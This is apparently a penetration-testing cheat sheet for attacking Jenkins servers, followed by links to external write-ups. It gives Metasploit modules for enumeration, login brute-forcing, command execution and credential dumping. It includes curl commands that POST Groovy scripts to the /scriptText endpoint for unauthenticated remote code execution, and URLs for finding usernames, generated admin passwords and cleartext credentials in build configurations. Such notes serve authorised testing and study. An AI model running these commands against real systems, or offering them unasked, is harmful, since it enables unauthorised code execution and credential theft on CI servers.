# Jenkins

## Reconnaissance

```
msf > use auxiliary/scanner/http/jenkins_enum
```

## Vulnerability Assessment

### Brute Force

```
msf > use auxiliary/scanner/http/jenkins_login
```

## Initial Foothold

### Unauthenticated RCE Exploit

```
$ curl -d "script=$(<./wget.groovy)" -X POST http://<target_IP>/scriptText

$ curl --data-urlencode "script=$(<./execute.groovy)" -X POST http://<target_IP>/scriptText
```

### Discovery

Enumerate available usernames by re-using credentials.

```
http://<IP>/manage/securityRealm/
```

Check the log recorders to find randomly generated `admin` password.

```
http://<IP>/manage/log/
```

Check projects and build jobs to view the settings. Sometimes they leave commands with clear text credentials.

```
http://<IP>/job/test/configure
```

### Command Execution

```
msf > use auxiliary/scanner/http/jenkins_command
```

### Upload Payload

#### Manual

> [!INFO]
> This method isn't mostly reliable. Use groovy to execute the payload.

**Build Steps** tab. Click the button **Add build step** then choose **Run with timeout**. Leave **timeout minutes** for `120` minutes. Then copy the commands with a second **Build Step** with a label **Execute Windows batch command**.

#### Metasploit

```
msf > use exploit/multi/http/jenkins_script_console

set rhost <target_IP>

set rport <target_PORT>
```

```
msf > use post/multi/gather/jenkins_gather

msf > use auxiliary/gather/jenkins_cred_recovery
```

### Dump Credentials

```
msf > use auxiliary/gather/jenkins_cred_recovery
```

---
## References

### Source Repositories

- [gquere: Pwn Jenkins](https://github.com/gquere/pwn_jenkins)

### Hacktricks

- [Hacktricks: Jenkins](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)

### Hacking Articles

- [Hacking Articles: Jenkins Penetration Testing](https://www.hackingarticles.in/jenkins-penetration-testing/)

### Highon Coffee

- [Highon Coffee: Jenkins RCE via Unauthenticated API](https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/)

### HDYSec

- [HDYSec: Double Pivoting both Metasploit and Manual Pivoting](https://web.archive.org/web/20240226150345/https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/)